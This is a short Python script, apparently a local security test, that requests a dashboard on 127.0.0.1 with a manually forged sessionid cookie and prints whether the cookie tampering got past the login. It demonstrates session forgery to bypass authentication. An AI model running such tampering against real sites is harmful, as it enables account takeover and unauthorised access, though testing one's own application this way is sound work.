import requests
from bs4 import BeautifulSoup

DASHBOARD_URL = "http://127.0.0.1:8000/dashboard/"

# 3️⃣ Cookie Tampering - Modifying sessionid manually
cookies = {"sessionid": "9999"}  # Modify manually
response = requests.get(DASHBOARD_URL, cookies=cookies)
print(f"Response: {response.text}")  # Print the response text for debugging
if "Welcome" in response.text:
    print(f"[+] Cookie tampering successful! sessionid=9999")
else:
    print("[-] Cookie tampering failed.")